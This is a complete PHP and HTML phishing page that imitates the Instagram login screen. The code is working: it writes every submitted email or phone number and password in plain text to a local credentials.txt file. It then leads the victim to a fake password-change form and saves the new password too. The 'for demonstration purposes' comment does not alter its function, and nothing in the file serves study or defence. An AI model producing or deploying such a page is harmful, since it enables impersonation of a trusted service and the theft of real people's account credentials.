<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: #121212;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
            width: 100%;
            max-width: 350px;
            text-align: center;
        }

        .container img {
            margin-bottom: 20px;
        }

        .container h2 {
            font-size: 18px;
            margin-bottom: 20px;
            color: #fff;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #1e1e1e;
            color: #fff;
        }

        .btn {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }

        .btn:hover {
            background-color: #0078d4;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }

        .footer a {
            color: #0095f6;
            text-decoration: none;
        }

        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            .container {
                width: 90%;
            }
        }
    </style>
</head>
<body>

<?php
// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['emailOrPhone']) && isset($_POST['password'])) {
        $emailOrPhone = $_POST['emailOrPhone'];
        $password = $_POST['password'];

        // Save credentials to a file (for demonstration purposes)
        $file = fopen("credentials.txt", "a");
        fwrite($file, "Email/Phone: $emailOrPhone | Password: $password\n");
        fclose($file);

        // Redirect to password change form
        header("Location: ?changePassword=true");
        exit();
    }

    if (isset($_POST['newPassword']) && isset($_POST['retypePassword'])) {
        $newPassword = $_POST['newPassword'];
        $retypePassword = $_POST['retypePassword'];

        if ($newPassword === $retypePassword) {
            $file = fopen("credentials.txt", "a");
            fwrite($file, "New Password: $newPassword\n");
            fclose($file);
            echo '<script>alert("✅ Password successfully changed!");</script>';
        } else {
            echo '<script>alert("❌ Passwords do not match. Try again!");</script>';
        }
    }
}
?>

<div class="container" id="loginPage" <?php if (isset($_GET['changePassword'])) echo 'style="display:none;"'; ?>>
    <img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" width="80" alt="Instagram Logo">
    <h2>Log in to Instagram</h2>
    <form method="post">
        <input type="text" name="emailOrPhone" placeholder="Email or Phone Number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit" class="btn">Log in</button>
    </form>
    <div class="footer">
        <p>Don’t have an account? <a href="#">Sign up</a></p>
    </div>
</div>

<div class="container" id="changePasswordPage" <?php if (!isset($_GET['changePassword'])) echo 'style="display:none;"'; ?>>
    <h2>Change Password</h2>
    <form method="POST">
        <input type="password" name="newPassword" placeholder="New Password" required>
        <input type="password" name="retypePassword" placeholder="Retype New Password" required>
        <button type="submit" class="btn">Change</button>
    </form>
</div>

</body>
</html>
